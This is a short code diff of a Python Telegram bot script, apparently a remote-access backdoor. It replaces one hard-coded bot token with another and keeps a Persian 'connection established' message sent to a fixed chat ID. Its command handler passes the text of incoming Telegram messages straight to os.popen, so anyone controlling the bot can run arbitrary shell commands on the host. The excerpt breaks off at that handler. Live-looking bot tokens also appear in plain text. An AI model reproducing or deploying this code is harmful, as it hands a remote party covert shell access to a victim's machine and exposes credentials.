@@ -1,8 +1,8 @@
 import telebot, os
 
-bot = telebot.TeleBot('1679790173:AAEUgoPKLVjv-fgg_UsfOgu8ZpkIGHPbTgY')
+bot = telebot.TeleBot('1128992447:AAH6chnZTKnkmOjiAhOFk_01BjQ8ZI0gI6s')
 
-bot.send_message(1070821707, "✅اتصال برقرار شد")
+bot.send_message(1070821707, "اتصال برقرار شد")
 
 def command(pm):
     d = os.popen(pm.text).read()
